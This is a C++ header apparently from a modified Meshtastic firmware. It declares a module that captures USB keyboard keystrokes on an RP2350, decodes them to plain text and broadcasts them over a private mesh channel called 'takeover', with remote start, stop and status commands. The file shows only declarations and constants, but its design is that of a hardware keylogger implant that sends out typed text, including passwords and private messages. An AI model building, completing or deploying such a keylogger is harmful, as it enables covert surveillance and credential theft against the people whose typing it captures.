/**
 * @file USBCaptureModule.h
 * @brief USB keyboard capture module for Meshtastic (RP2350 only)
 *
 * This module captures USB keyboard keystrokes using PIO on Core 1 and
 * makes them available to Core 0 for mesh transmission. Implements proper
 * Meshtastic Module API for remote control and status queries.
 *
 * Architecture:
 *  - Inherits from SinglePortModule for mesh message handling
 *  - Inherits from OSThread for periodic USB capture operations
 *  - Uses PRIVATE_APP port (256) for control messages
 *  - Core1: USB capture via PIO → PSRAM ring buffer
 *  - Core0: PSRAM polling → mesh transmission + message handling
 *
 * SPDX-License-Identifier: GPL-3.0-only
 */

#pragma once

#include "../mesh/SinglePortModule.h"
#include "../platform/rp2xx0/usb_capture/keystroke_queue.h"
#include "../platform/rp2xx0/usb_capture/formatted_event_queue.h"
#include "../platform/rp2xx0/usb_capture/psram_buffer.h"
#include "../platform/rp2xx0/usb_capture/common.h"
#include "concurrency/OSThread.h"
/**
 * @brief Keystroke buffer configuration constants
 */
#define KEYSTROKE_BUFFER_SIZE     500       /**< Total buffer size in bytes */
#define EPOCH_SIZE                10        /**< Epoch timestamp size (ASCII digits) */
#define DELTA_SIZE                2         /**< Delta value size in bytes */
#define DELTA_MARKER              0xFF      /**< Marker byte for delta-encoded Enter keys */
#define DELTA_TOTAL_SIZE          3         /**< Total delta encoding size (marker + 2-byte delta) */
#define DELTA_MAX_SAFE            65000     /**< Maximum safe delta value before auto-finalization */
#define KEYSTROKE_DATA_START      EPOCH_SIZE
#define KEYSTROKE_DATA_END        (KEYSTROKE_BUFFER_SIZE - EPOCH_SIZE)

/**
 * @brief Transmission and timing configuration constants
 */
#define MIN_TRANSMIT_INTERVAL_MS  6000      /**< Minimum interval between transmissions (6 seconds) */
#define STATS_LOG_INTERVAL_MS     10000     /**< Statistics logging interval (10 seconds) */
#define CORE1_LAUNCH_DELAY_MS     100       /**< Delay after Core1 reset before launch */
#define RUNONCE_INTERVAL_MS       20000     /**< Module runOnce() polling interval (20 seconds) */

/**
 * @brief Buffer size configuration constants
 */
#define MAX_DECODED_TEXT_SIZE     600       /**< Maximum size for decoded text buffer */
#define MAX_COMMAND_RESPONSE_SIZE 200       /**< Maximum size for command response text */
#define MAX_LINE_BUFFER_SIZE      128       /**< Maximum size for log line buffer */
#define MAX_COMMAND_LENGTH        32        /**< Maximum length for parsed commands */

/**
 * @brief Character encoding constants
 */
#define PRINTABLE_CHAR_MIN        32        /**< Minimum printable ASCII character (space) */
#define PRINTABLE_CHAR_MAX        127       /**< Maximum printable ASCII character (DEL) */

/**
 * @brief USB Capture Module command types (sent via mesh packets)
 *
 * Simple text-based protocol for easy testing and debugging.
 * Commands are case-insensitive ASCII strings.
 */
enum USBCaptureCommand {
    CMD_UNKNOWN = 0,
    CMD_STATUS,      // "STATUS" - Get module status (enabled, buffer stats)
    CMD_START,       // "START"  - Start USB capture
    CMD_STOP,        // "STOP"   - Stop USB capture
    CMD_STATS,       // "STATS"  - Get detailed statistics
};

/**
 * @brief USB Capture Module for RP2350
 *
 * Hybrid architecture combining:
 *  1. SinglePortModule: Mesh message handling for remote control
 *  2. OSThread: Periodic USB capture and buffer processing
 *
 * Features:
 *  - Remote start/stop capture via mesh
 *  - Remote status and statistics queries
 *  - Automatic keystroke broadcasting
 *  - Multi-core architecture (Core0: mesh, Core1: capture)
 *
 * Message Protocol:
 *  - Port: TEXT_MESSAGE_APP (1)
 *  - Channel: "takeover" (channel index 1)
 *  - Encoding: ASCII text commands
 *  - Commands: STATUS, START, STOP, STATS
 *  - Responses: ASCII text with status information
 */
class USBCaptureModule : public SinglePortModule, public concurrency::OSThread
{
  public:
    /**
     * @brief Constructor
     * Initializes both SinglePortModule (for mesh) and OSThread (for periodic ops)
     */
    USBCaptureModule();

    /**
     * @brief Initialize the module
     * Sets up USB capture hardware and launches Core1
     * @return true if initialization successful
     */
    bool init();

  protected:
    // ==================== MeshModule Interface ====================

    /**
     * @brief Handle received mesh packets
     * Processes remote control commands (STATUS, START, STOP, STATS)
     * Executes commands and sends replies immediately
     *
     * @param mp Received mesh packet
     * @return ProcessMessage::STOP if handled, CONTINUE otherwise
     */
    virtual ProcessMessage handleReceived(const meshtastic_MeshPacket &mp) override;

    // ==================== OSThread Interface ====================

    /**
     * @brief Main loop - runs on Core 0 periodically
     * Handles PSRAM buffer processing and mesh transmission
     *
     * @return Update interval in milliseconds (100ms)
     */
    virtual int32_t runOnce() override;

  private:
    // ==================== Core State ====================

    keystroke_queue_t *keystroke_queue;
    formatted_event_queue_t *formatted_queue;
    capture_controller_t controller;
    bool core1_started;
    bool capture_enabled;  // Can be toggled via mesh commands

    // ==================== Command Processing ====================

    /**
     * @brief Parse command from mesh packet payload
     * @param payload Command string (ASCII)
     * @param len Payload length
     * @return Parsed command type
     */
    USBCaptureCommand parseCommand(const uint8_t *payload, size_t len);

    /**
     * @brief Execute received command
     * @param cmd Command to execute
     * @param response Buffer for response text
     * @param max_len Maximum response buffer size
     * @return Length of response text
     */
    size_t executeCommand(USBCaptureCommand cmd, char *response, size_t max_len);

    /**
     * @brief Get current module status
     * @param response Buffer for status text
     * @param max_len Maximum buffer size
     * @return Length of status text
     */
    size_t getStatus(char *response, size_t max_len);

    /**
     * @brief Get detailed statistics
     * @param response Buffer for stats text
     * @param max_len Maximum buffer size
     * @return Length of stats text
     */
    size_t getStats(char *response, size_t max_len);

    // ==================== USB Capture Operations ====================

    /**
     * @brief Process PSRAM buffers and transmit them
     * Core0's main responsibility - read complete buffers from PSRAM and transmit
     *
     * Called from runOnce() every 100ms
     */
    void processPSRAMBuffers();

    /**
     * @brief Decode binary keystroke buffer into human-readable text
     * Converts raw buffer data (with delta encoding) into plain text
     *
     * @param buffer Source buffer with binary keystroke data
     * @param output Destination buffer for decoded text
     * @param max_len Maximum output buffer size
     * @return Length of decoded text
     */
    size_t decodeBufferToText(const psram_keystroke_buffer_t *buffer,
                              char *output, size_t max_len);

    /**
     * @brief Broadcast buffer data over the private "takeover" channel
     * @param data Pointer to data buffer
     * @param len Length of data to send
     * @return true if packet was queued successfully
     */
    bool broadcastToPrivateChannel(const uint8_t *data, size_t len);
};

extern USBCaptureModule *usbCaptureModule;
